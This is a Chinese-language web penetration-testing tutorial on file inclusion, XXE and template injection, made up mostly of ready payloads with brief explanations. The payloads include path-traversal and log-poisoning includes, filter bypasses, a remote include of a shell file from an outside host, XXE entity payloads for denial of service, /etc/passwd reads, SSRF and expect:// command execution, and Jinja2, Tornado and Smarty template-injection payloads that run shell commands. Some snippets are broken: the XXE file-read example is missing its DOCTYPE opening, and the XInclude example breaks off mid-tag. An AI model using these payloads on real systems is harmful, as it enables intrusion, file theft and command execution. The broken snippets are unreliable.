# WEB安全渗透测试基础知识（九）

**3.8. 文件包含**

3.8. 文件包含

3.8.1. 基础

常见的文件包含漏洞的形式为 <?php include("inc/" . $_GET['file']); ?>  
考虑常用的几种包含方式为  
同目录包含 file=.htaccess
目录遍历 ?file=../../../../../../../../../var/lib/locate.db
日志注入 ?file=../../../../../../../../../var/log/apache/error.log
利用 /proc/self/environ
其中日志可以使用SSH日志或者Web日志等多种日志来源测试
------------

3.8.2. 绕过技巧

常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式

3.8.2.1. url编码绕过

如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过

3.8.2.2. 特殊字符绕过

某些情况下，读文件支持使用Shell通配符，如 ? * 等
url中 使用 ? # 可能会影响include包含的结果
某些情况下，unicode编码不同但是字形相近的字符有同一个效果

3.8.2.3. %00截断

几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。

3.8.2.4. 长度截断
Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。

msdn定义“`#define MAX_PATH 260“`，第260个字符为字符串结尾的“`0“`  

linux可以用getconf来判断文件名长度限制和文件路径长度限制  

获取最长文件路径长度：getconf PATH_MAX /root 得到4096 获取最长文件名：getconf NAME_MAX /root 得到255  

那么在长度有限的时候，`././././` (n个) 的形式就可以通过这个把路径爆掉  

在php代码包含中，这种绕过方式要求php版本 < php 5.2.8

3.8.2.5. 伪协议绕过

- 远程包含: 要求 allow_url_fopen=On and allow_url_include=On ， payload为 ?file=[http|https|ftp]://websec.wordpress.com/shell.txt
- PHP INPUT: 把payload放在POST参数中作为包含的文件，要求 allow_url_include=On ，payload为 ?file=php://input
- BASE64: 使用Base64伪协议读取文件，payload为 ?file=php://filter/convert.base64-encode/resource=index.php
- DATA: 使用data伪协议读取文件，payload为 ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= 要求 allow_url_include=On


---

**3.9. XXE**

3.9.1. XML基础

XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。

---

3.9.2. XXE

当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。


---
3.9.3. 攻击方式

3.9.3.1. 拒绝服务攻击

<!DOCTYPE data [ 
<!ELEMENT data (#ANY)> 
<!ENTITY a0 "dos" > 
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;"> 
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;"> 
]> 
<data>&a2;</data>


若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。


3.9.3.2. 文件读取

<?xml version="1.0"?> 

<!ELEMENT data (#ANY)> 
<!ENTITY file SYSTEM "file:///etc/passwd"> 
]> 
<data>&file;</data>
3.9.3.3. SSRF
<?xml version="1.0"?> 
<!DOCTYPE data SYSTEM "http://publicServer.com/" [ 
<!ELEMENT data (#ANY)> 
]> 
<data>4</data>
3.9.3.4. RCE
<?xml version="1.0"?> 
<!DOCTYPE GVI [ <!ELEMENT foo ANY > 
<!ENTITY xxe SYSTEM "expect://id" >]> 
<catalog>    
       <core id="test101">       
         <description>&xxe;</description>    
     </core> 
</catalog>


3.9.3.5. XInclude

<?xml version='1.0'?> 
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:incl



---

**3.10 模板注入漏洞**

3.10. 模版注入

3.10.1. 简介

模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。

---
3.10.2. 测试方法

- 确定使用的引擎
- 查看引擎相关的文档，确定其安全机制以及自带的函数和变量
- 需找攻击面，尝试攻击


---
3.10.3. 测试用例

- 简单的数学表达式，{{ 7+7 }} => 14
- 字符串表达式 {{ "ajin" }} => ajin
- Ruby

<%= 7 * 7 %>

<%= File.open('/etc/passwd').read %>

- Java

${7*7}

- Twig

{{7*7}}


- Smarty

{php}echo `id`;{/php}

- AngularJS

$eval('1+1')

- Tornado

引用模块 {% import module %}

=> {% import os %}{{ os.popen("whoami").read() }}

- Flask/Jinja2
- 
{{ config.items() }}

{{''.__class__.__mro__[-1].__subclasses__()}}

- Django
- 
{{ request }}

{% debug %}

{% load module %}

{% include "x.html" %}

{% extends "x.html" %}


---
3.10.4. 目标

- 创建对象
- 文件读写
- 远程文件包含
- 信息泄漏 提权



---
3.10.5. 相关属性

3.10.5.1. __class__

python中的新式类（即显示继承object对象的类）都有一个属性 __class__ 用于获取当前实例对应的类，例如 "".__class__ 就可以获取到字符串实例对应的类

3.10.5.2. __mro__

python中类对象的 __mro__ 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。

3.10.5.3. __globals__

保存了函数所有的所有全局变量，在利用中，可以使用 __init__ 获取对象的函数，并通过 __globals__ 获取 file os 等模块以进行下一步的利用

3.10.5.4. __subclasses__()

python的新式类都保留了它所有的子类的引用，__subclasses__() 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。  

因为python中的类都是继承object的，所以只要调用object类对象的 __subclasses__() 方法就可以获取想要的类的对象。


---
3.10.6. 常见Payload

- ().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()

- ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )


---
3.10.7. 绕过技巧

3.10.7.1. 字符串拼接

request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]
3.10.7.2. 使用参数绕过
params = {     
    'clas': '__class__',    
    'mr': '__mro__',     
 'subc': '__subclasses__' 
} 
data = {     
  "data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}" 
} 
r = requests.post(url, params=params, data=data) 
print(r.text)